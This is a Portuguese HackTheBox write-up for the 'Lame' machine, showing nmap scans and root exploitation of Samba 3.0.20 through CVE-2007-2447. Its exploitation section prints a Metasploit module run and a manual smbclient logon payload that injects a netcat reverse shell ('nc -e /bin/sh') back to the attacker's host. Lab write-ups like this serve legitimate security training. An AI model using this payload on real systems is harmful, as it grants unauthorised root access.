Lame

HackTheBox · Easy by Brenno M.

Lame é um Linux antigo que cai em um passo: o Samba 3.0.20 repassa o nome de usuário ao shell sem sanitizar quando a opção username map script está ativa (CVE-2007-2447), e o comando roda como root.

Reconhecimento

O Nmap mostra FTP, SSH, SMB (139/445) e o distccd na 3632. A varredura de versões identifica o vsftpd 2.3.4 e o Samba 3.0.20-Debian.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p21,22,139,445,3632 <IP>
# 21 vsftpd 2.3.4, 22 OpenSSH 4.7p1, 139/445 Samba 3.0.20-Debian, 3632 distccd

O vsftpd 2.3.4 é famoso pelo backdoor do :) no usuário, mas a porta 6200 que ele abriria é bloqueada pelo firewall. O caminho é o Samba.

Exploração - CVE-2007-2447

Um usuário no formato /=`comando` faz o Samba executar o comando antes mesmo da autenticação. Como o smbd roda como root, a shell já chega com privilégio máximo.

msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS <IP>
set LHOST tun0
run

Sem Metasploit, o mesmo payload vai no login do smbclient, contra o compartilhamento tmp, que aceita sessão anônima.

nc -lvnp 4444
smbclient //<IP>/tmp -N -c 'logon "/=`nohup nc -e /bin/sh <MEU_IP> 4444`"'
id
cat /home/makis/user.txt /root/root.txt
